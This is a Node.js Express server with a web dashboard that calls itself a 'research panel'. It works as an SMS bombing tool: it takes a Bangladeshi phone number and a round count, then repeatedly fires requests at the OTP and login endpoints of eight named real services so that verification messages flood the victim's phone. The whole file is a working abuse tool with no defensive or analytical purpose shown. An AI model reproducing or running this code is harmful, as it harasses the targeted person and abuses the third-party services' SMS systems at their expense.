const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.use(express.json());

// --- UI DASHBOARD ---
app.get('/', (req, res) => {
    res.send(`
        <div style="font-family: 'Segoe UI', sans-serif; text-align: center; margin-top: 50px; background-color: #f4f7f9; min-height: 100vh; padding: 20px;">
            <div style="background: white; padding: 40px; border-radius: 20px; display: inline-block; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border-top: 10px solid #6c5ce7; width: 500px;">
                <h1 style="color: #6c5ce7; margin-bottom: 5px;">AIO Master Research Panel</h1>
                <p style="color: #636e72;">Targeting 8+ Integrated APIs (Instant & Sequential)</p>
                
                <div style="margin-top: 30px;">
                    <input type="text" id="phone" placeholder="Mobile (e.g. 017XXXXXXXX)" style="padding: 15px; width: 100%; border: 2px solid #eee; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s;" onfocus="this.style.borderColor='#6c5ce7'" /><br><br>
                    <input type="number" id="count" placeholder="Number of Rounds" style="padding: 15px; width: 100%; border: 2px solid #eee; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none;" /><br><br>
                    <button onclick="startMasterSystem()" id="btn" style="padding: 18px; background: #6c5ce7; color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 18px; width: 100%; transition: 0.3s;">🚀 Launch Ultimate Analysis</button>
                </div>
            </div>

            <div id="logs" style="margin-top: 30px; text-align: left; max-width: 800px; margin-left: auto; margin-right: auto; background: #1e272e; color: #a29bfe; padding: 20px; border-radius: 12px; height: 400px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 13px; border: 2px solid #2d3436; line-height: 1.6;">
                > System Online. Standing by for instructions...
            </div>
        </div>

        <script>
            async function startMasterSystem() {
                const phone = document.getElementById('phone').value;
                const count = document.getElementById('count').value;
                const logs = document.getElementById('logs');
                const btn = document.getElementById('btn');

                if(!phone || !count) return alert("সব তথ্য দিন!");

                btn.disabled = true;
                btn.style.background = "#b2bec3";
                btn.innerText = "System Executing...";
                logs.innerHTML = '<span style="color: #fdcb6e;">> Initialization complete. Targeting: ' + phone + '</span><br>';

                const response = await fetch('/run-master-aio', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, count })
                });

                const reader = response.body.getReader();
                const decoder = new TextDecoder();

                while (true) {
                    const { done, value } = await reader.read();
                    if (done) break;
                    logs.innerHTML += decoder.decode(value);
                    logs.scrollTop = logs.scrollHeight;
                }

                logs.innerHTML += '<br><span style="color: #55efc4;">> --- Task Cycle Finished ---</span>';
                btn.disabled = false;
                btn.innerText = "🚀 Launch Ultimate Analysis";
                btn.style.background = "#6c5ce7";
            }
        </script>
    `);
});

// --- BACKEND LOGIC ---
app.post('/run-master-aio', async (req, res) => {
    const { phone, count } = req.body;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Transfer-Encoding', 'chunked');

    // ফোন নাম্বার অটো-কারেকশন
    const raw = phone.replace('+88', '').trim(); // ১০ ডিজিট
    const withPlus = phone.startsWith('+88') ? phone : '+88' + raw; // +৮৮ সহ

    for (let i = 1; i <= count; i++) {
        res.write(`<b style="color: #00cec9;">[Round ${i}]</b> Starting parallel threads...<br>`);

        // এপিআই প্রমিজ লিস্ট
        const apiTasks = [
            // 1. Shwapno
            axios.post("https://www.shwapno.com/api/auth", { "phoneNumber": withPlus },
                { headers: { 'origin': 'https://www.shwapno.com' } }).then(() => res.write(`- Shwapno: ✅ Success<br>`)).catch(() => { }),

            // 2. DocTime
            axios.post("https://api.doctime.net/api/authenticate", { "code": "88", "contact_no": raw, "country_calling_code": "88" },
                { headers: { 'referer': 'https://app.doctime.com.bd/' } }).then(() => res.write(`- DocTime: ✅ Success<br>`)).catch(() => { }),

            // 3. eCourier
            axios.get(`https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${raw}`,
                { headers: { 'Referer': 'https://ecourier.com.bd/' } }).then(() => res.write(`- eCourier: ✅ Success<br>`)).catch(() => { }),

            // 4. MCQ Mentor
            axios.get(`https://mcqmentor-api.on-forge.com/api/get-otp?phone=${raw}`).then(() => res.write(`- MCQ Mentor: ✅ Success<br>`)).catch(() => { }),

            // 5. Arogga
            axios.post("https://api.arogga.com/auth/v1/sms/send/?f=web", new URLSearchParams({ 'mobile': raw }).toString())
                .then(() => res.write(`- Arogga: ✅ Success<br>`)).catch(() => { }),

            // 6. Bikroy
            axios.get(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${raw}`,
                { headers: { 'application-name': 'web', 'cookie': 'ab-test.pwa-only=reactapp;' } }).then(() => res.write(`- Bikroy: ✅ Success<br>`)).catch(() => { }),

            // 7. E-Square
            axios.get(`https://api.e-square.com.bd/api/get-otp?phone=${raw}`,
                { headers: { 'origin': 'https://www.e-square.com.bd' } }).then(() => res.write(`- E-Square: ✅ Success<br>`)).catch(() => { }),

            // 8. CartUp
            axios.post("https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup", { "email_or_phone": raw },
                { headers: { 'origin': 'https://cartup.com' } }).then(() => res.write(`- CartUp: ✅ Success<br>`)).catch(() => { })
        ];

        // সব এপিআই একসাথে চালানো
        await Promise.allSettled(apiTasks);

        // প্রতি রাউন্ডের মাঝে ২ সেকেন্ড গ্যাপ (সার্ভার সেফটি)
        if (i < count) await new Promise(r => setTimeout(r, 2000));
    }

    res.end();
});

app.listen(port, () => console.log(`Master AIO Lab: http://localhost:${port}`));